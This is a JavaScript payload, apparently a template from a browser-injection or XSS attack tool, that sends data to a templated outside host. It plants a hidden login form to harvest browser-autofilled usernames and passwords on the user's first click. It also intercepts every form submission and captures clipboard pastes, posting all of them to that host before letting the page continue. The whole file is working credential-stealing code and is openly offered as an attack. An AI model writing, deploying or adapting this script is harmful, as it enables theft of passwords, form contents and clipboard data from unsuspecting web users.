function sendReport(type, data, done_callback) {
    var payload = {
        "type": type,
        "data": data,
        "loc": window.location.href
    };
    var req = new XMLHttpRequest();
    if (done_callback) {
        req.onreadystatechange = function() {
            if (req.readyState == XMLHttpRequest.HEADERS_RECEIVED || req.readyState == XMLHttpRequest.DONE) {
                delete req.onreadystatechange;
                done_callback();
            }
        };
    }
    req.withCredentials = true;
    req.open("POST", "{{ protocol }}://{{ host }}:{{ port }}/{{ path }}");
    req.setRequestHeader("Content-Type", "application/json");
    req.send(JSON.stringify(payload));
}

function createCredsForm() {
    var formElem = document.createElement("form");
    formElem.setAttribute("method", "GET");
    formElem.setAttribute("action", "index.html");
    formElem.setAttribute("autocomplete", "on");
    formElem.style.display = "none";

    function addInputElement(name, type, autocompleteAttribute) {
        var inputElem = document.createElement("input");
        inputElem.toggleAttribute("required", true);
        inputElem.setAttribute("type", type);
        inputElem.setAttribute("name", name);
        inputElem.setAttribute("id", "^" + name);

        if (autocompleteAttribute !== undefined) {
            inputElem.setAttribute("autocomplete", autocompleteAttribute);
        }

        formElem.appendChild(inputElem);
    }

    addInputElement("user", "text");
    addInputElement("pass", "password");

    document.getElementsByTagName("body")[0].appendChild(formElem);

    return formElem;
}

function getFormInputs(formElem) {
    var inputs = [];
    for (var i = 0; i < formElem.children.length; i++) {
        var inputElem = formElem.children[i];
        var inputElemName = inputElem.getAttribute("name");
        var inputElemValue = inputElem.value;
        //inputs[inputElemName] = inputElemValue;
        inputs.push(inputElemValue);
    }
    return inputs;
}


// Hook form submits
function submitHook(e) {
     // https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement
    var form = e.target;
    if (form.in_submit) {
        return true;
    }
    // Serialize form
    var formData = {};
    for (var i = 0; i < form.length; i++) {
        var formInput = form[i];
        if (formInput.type == "submit") {
            continue;
        }
        var formInputValue;
        if (formInput.type == "checkbox") {
            formInputValue = formInput.checked;
        } else {
            formInputValue = formInput.value;
        }
        formData[formInput.name] = formInputValue;
    }
    
    sendReport("formSubmit", {
        act: form.getAttribute("action"),
        meth: form.getAttribute("method"),
        data: formData
    }, function done() {
        //console.log("Submitting form");
        form.in_submit = true;
        HTMLFormElement.prototype.submit.call(form);
        delete form.in_submit;
    });

    // Postpone form submission to the moment we complete the report
    e.preventDefault();
    return false;
}

// Hook clipboard paste events
function clipboardPasteHook(e) {
    sendReport("clipboard", {
       type: e.type,
       data: e.clipboardData.getData("text")
    });
}

// Hijack user's credentials
function clickHook(e) {
    var credsInputs = getFormInputs(credsFormElem);
    sendReport("creds", {
       "user": credsInputs[0],
       "pass": credsInputs[1]
    });  
    document.removeEventListener("click", clickHook);
}

var credsFormElem = createCredsForm();
document.addEventListener("submit", submitHook, true);
document.addEventListener("paste", clipboardPasteHook, true);
document.addEventListener("click", clickHook)    

